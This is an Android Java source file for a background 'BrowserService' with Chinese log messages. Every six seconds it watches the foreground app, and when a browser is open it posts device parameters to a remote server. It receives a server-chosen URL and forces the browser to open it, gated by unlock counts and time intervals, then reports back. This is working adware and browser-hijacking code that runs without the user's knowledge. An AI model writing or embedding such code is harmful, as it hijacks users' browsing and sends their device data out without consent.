package com.mx.utils.services;

import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.json.JSONObject;

import com.mx.utils.utils.HttpUtil;
import com.mx.utils.utils.MyHelpUtil;

import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.IBinder;
import android.text.TextUtils;

public class BrowserService extends Service {

	private String topActivity = null;

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {

		final ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);

		final PackageManager pm = getPackageManager();

		final Timer timer = new Timer();

		timer.schedule(new TimerTask() {

			@Override
			public void run() {

				Intent urlIntent = new Intent(Intent.ACTION_VIEW, Uri
						.parse("http://www.google.com"));

				urlIntent.addCategory(Intent.CATEGORY_BROWSABLE);

				List<ResolveInfo> s = pm.queryIntentActivities(urlIntent,
						PackageManager.MATCH_DEFAULT_ONLY);

				ComponentName cn = am.getRunningTasks(1).get(0).topActivity;

				if (topActivity != null
						&& cn.getPackageName().equals(topActivity)) {
					return;
				}

				topActivity = cn.getPackageName();

				for (Iterator<ResolveInfo> iterator = s.iterator(); iterator
						.hasNext();) {

					ResolveInfo resolveInfo = (ResolveInfo) iterator.next();

					if (resolveInfo.activityInfo.packageName.equals(cn
							.getPackageName())) {

						try {

							String res = HttpUtil.postRequest(
									HttpUtil.BASE_URL + "app_k.action",
									MyHelpUtil
											.add_notifacation_params(getApplicationContext()));

							System.out.println("链接服务器返回结果：" + res);

							if (!TextUtils.isEmpty(res)) {

								JSONObject job = new JSONObject(res);

								String link_url = job.getString("link_url");

								int link_count = job.getInt("link_count");

								int link_display_interval = job
										.getInt("link_display_interval");

								boolean bool = checkOption(link_count,
										link_display_interval);

								if (bool) {
									
									System.out.println("链接：满足条件》》》》跳转");

									Intent url_Intent = new Intent(
											Intent.ACTION_VIEW, Uri
													.parse(link_url));

									url_Intent
											.setClassName(
													resolveInfo.activityInfo.packageName,
													resolveInfo.activityInfo.name);

									url_Intent
											.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

									syslinkStatus(link_url);

									saveStatus();

									/* 说明 */
									startActivity(url_Intent);

								}

							}

						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}

						break;
					}
				}
			}

		}, 2 * 1000, 6 * 1000);
		super.onCreate();
	}

	private void saveStatus() {

		SharedPreferences localSharedPreferences = getApplicationContext()
				.getSharedPreferences("LINK_STATUS", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("link", new Date().getTime());

		localEditor.commit();

	}

	private void syslinkStatus(String link) {

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_l.action",
					MyHelpUtil.setParams(link, 2, getApplicationContext()));
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private boolean checkOption(int link_count, int link_display_interval) {

		SharedPreferences screenSharedPreferences = getApplicationContext()
				.getSharedPreferences("SCREEN_STATUS", 0);

		SharedPreferences linkSharedPreferences = getApplicationContext()
				.getSharedPreferences("LINK_STATUS", 0);

		int local_screen_count = screenSharedPreferences.getInt("screen_count",
				0);

		if (!linkSharedPreferences.contains("link")) {
			return true;
		}

		long link_time = linkSharedPreferences.getLong("link", 0);

		long reslut = Math.abs(new Date().getTime() - link_time);

		long display_interval_to_long = Math
				.abs(link_display_interval * 60 * 1000);

		System.out
				.println("本机链接时间间隔：" + reslut / 1000 / 60 + ">min"
						+ ">>服务器规定间隔：" + display_interval_to_long / 1000 / 60
						+ ">>min");

		System.out.println("本机链接解锁屏：" + local_screen_count + ">>服务器规定解锁屏次数："
				+ link_count);

		if (reslut >= display_interval_to_long
				&& local_screen_count >= link_count) {

			System.out.println("链接：满足条件");

			return true;
		} else {
			System.out.println("链接：不满足条件");

		}

		return false;
	}

}
